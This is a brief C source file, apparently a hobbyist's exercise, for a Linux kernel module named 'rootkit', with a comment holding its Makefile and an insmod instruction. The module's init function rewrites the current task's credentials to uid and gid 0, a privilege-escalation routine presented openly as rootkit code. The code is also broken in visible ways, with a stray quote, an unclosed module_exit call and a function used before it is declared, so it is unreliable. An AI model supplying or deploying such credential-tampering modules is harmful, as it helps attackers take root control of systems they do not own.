/*
Just learning some tings

Makefile: 
-----------
obj-m += rootkit.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
------------
then: $ insmod rootkit.ko
and we good to g0g0!
*/

#include <linux/module.h>   
#include <linux/kernel.h>   
#include <linux/init.h>      

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ka^Io");'
module_init(g0g0);
module_exit(farewell;

static int __init g0g0(void)
{
    struct task_struct *t4sk;
    struct cred *cr3d;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);


    t4sk = get_current();
    if (t4sk == NULL) {
      printk("Failed to get current task info.\n");
      return -1;
    }

    cr3d = prepare_creds();
    if (cr3d == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }

    cr3d->uid = kuid;
    cr3d->gid = kgid;
    cr3d->euid = kuid;
    cr3d->egid = kgid;

    commit_creds(cr3d);
    return 0;    
}

static void __exit farewell(void)
{
    printk(KERN_INFO "goodbye\n");
}

